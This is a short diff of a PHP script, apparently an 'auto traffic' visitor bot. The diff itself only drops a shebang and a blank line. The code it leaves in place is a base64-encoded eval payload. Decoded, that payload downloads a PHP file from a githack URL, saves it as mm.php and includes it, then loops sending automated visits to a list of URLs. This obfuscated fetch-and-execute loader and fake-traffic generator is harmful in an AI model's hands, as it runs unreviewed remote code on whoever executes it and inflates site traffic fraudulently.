@@ -1,4 +1,3 @@
-#!/usr/bin/env php
 <?php
 eval(base64_decode("PD9waHAKc3lzdGVtKCJjbGVhciIpOwpjb3B5KCdodHRwczovL3Jhdy5naXRoYWNrLmNvbS9taW5h
 LWFsYWJkL3RyYWZmL21haW4vdXJsLnBocCcsICdtbS5waHAnKTsKaW5jbHVkZSAnbW0ucGhwJzsK
@@ -140,5 +139,4 @@ fn5+IEFVVE8gIFRSQUZGSUMgIDIwMjIgfn5+fn5cbiAgIjsgCmZvcigkaSA9IDE7ICRpIDwgJG1h
 eCsxOyAkaSsrKSB7CmZvciAoJHU9MDsgJHUgPCBjb3VudCgkdXJsKTsgJHUrKykgeyAKJGNsYXNz
 ID0gbmV3IGF1dG92aXNpdG9yKCR1cmxbJHVdKTsKZWNobyAkaS4gIi4gJHVybFskdV0gLSBbIi4k
 Y2xhc3MtPmphbGFua2FuKCkuIlxuIjsKfX0KfSA="));
-
 ?>
